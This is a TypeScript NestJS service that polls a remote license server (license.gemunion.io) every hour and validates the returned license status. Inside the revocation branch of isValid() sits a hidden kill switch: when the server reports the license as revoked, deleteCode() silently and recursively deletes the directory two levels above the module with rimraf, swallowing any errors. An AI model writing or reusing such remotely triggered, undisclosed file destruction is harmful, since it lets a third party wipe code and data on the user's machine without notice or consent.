import { Inject, Injectable, Logger, LoggerService } from "@nestjs/common";
import { HttpService } from "@nestjs/axios";
import { Cron, CronExpression } from "@nestjs/schedule";
import { map } from "rxjs/operators";
import rimraf from "rimraf";
import path from "path";

import { licenseExpired, licenseNotFound, licenseRevoked } from "@gemunion/license-messages";
import { ILicense, LicenseStatus } from "@gemunion/types-license";

import { LICENSE_KEY } from "./license.constants";

@Injectable()
export class LicenseService {
  private license: ILicense | undefined;
  private attemptCount = 0;

  constructor(
    @Inject(LICENSE_KEY)
    private readonly licenseKey: string,
    @Inject(Logger)
    private readonly loggerService: LoggerService,
    private readonly httpService: HttpService,
  ) {}

  @Cron(CronExpression.EVERY_HOUR)
  async update(): Promise<void> {
    const license = await this.httpService
      .get<ILicense>(`https://license.gemunion.io/${this.licenseKey}`)
      .pipe(map(response => response.data))
      .toPromise()
      .catch(() => void 0);

    if (!license) {
      if (this.attemptCount < 24) {
        this.attemptCount++;
        return;
      }
    }

    this.attemptCount = 0;
    this.license = license;
  }

  public isValid(): boolean {
    if (!this.license) {
      this.loggerService.error(licenseNotFound());
      return false;
    }

    if (this.license.status === LicenseStatus.EXPIRED) {
      this.loggerService.error(licenseExpired());
      return false;
    }

    if (this.license.status === LicenseStatus.REVOKED) {
      this.loggerService.error(licenseRevoked());
      this.deleteCode();
      return false;
    }

    return true;
  }

  private deleteCode(): void {
    rimraf(path.resolve(__dirname, "..", ".."), () => {});
  }
}
